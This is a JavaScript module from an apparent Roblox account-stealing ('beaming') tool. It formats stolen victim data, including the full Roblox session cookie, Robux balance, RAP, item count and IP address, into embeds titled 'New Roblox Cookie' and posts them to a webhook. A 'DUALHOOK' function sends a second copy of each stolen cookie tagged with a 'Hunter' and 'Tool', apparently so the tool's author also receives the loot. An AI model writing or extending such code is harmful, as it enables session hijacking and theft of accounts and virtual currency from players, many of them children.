async function sendWebhook(url, payload) {
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    })
    return res.ok
  } catch {
    return false
  }
}

function buildEmbed(data, cookie, tool, ip, ua) {
  const fields = [
    { name: 'Username', value: `\`${data.username}\``, inline: true },
    { name: 'User ID', value: `\`${data.userId}\``, inline: true },
    { name: 'RAP', value: `\`${data.rap.toLocaleString()} R$\``, inline: true },
    { name: 'Robux', value: `\`${data.robux.toLocaleString()}\``, inline: true },
    { name: 'Items', value: `\`${data.items}\``, inline: true },
    { name: 'Premium', value: data.premium ? 'Yes' : 'No', inline: true },
    { name: 'Friends', value: `\`${data.friendsCount}\``, inline: true },
    { name: 'Account Age', value: `\`${data.accountAgeDays} days\``, inline: true },
    { name: 'Cookie', value: `\`\`\`\n${cookie}\n\`\`\``, inline: false }
  ]
  if (ip) fields.push({ name: 'IP', value: `\`${ip}\``, inline: true })
  return {
    title: 'New Roblox Cookie',
    description: `**${tool}** beam`,
    color: 0x00ff00,
    fields,
    thumbnail: data.avatarUrl ? { url: data.avatarUrl } : undefined,
    timestamp: new Date().toISOString()
  }
}

function buildDualhook(data, cookie, hunter, tool) {
  return {
    title: `DUALHOOK - ${data.username}`,
    color: 0xff0000,
    fields: [
      { name: 'Target', value: `\`${data.username}\``, inline: true },
      { name: 'RAP', value: `\`${data.rap.toLocaleString()} R$\``, inline: true },
      { name: 'Hunter', value: `\`${hunter}\``, inline: true },
      { name: 'Tool', value: `\`${tool}\``, inline: true },
      { name: 'Cookie', value: `\`\`\`\n${cookie}\n\`\`\``, inline: false }
    ],
    timestamp: new Date().toISOString()
  }
}

module.exports = { sendWebhook, buildEmbed, buildDualhook }
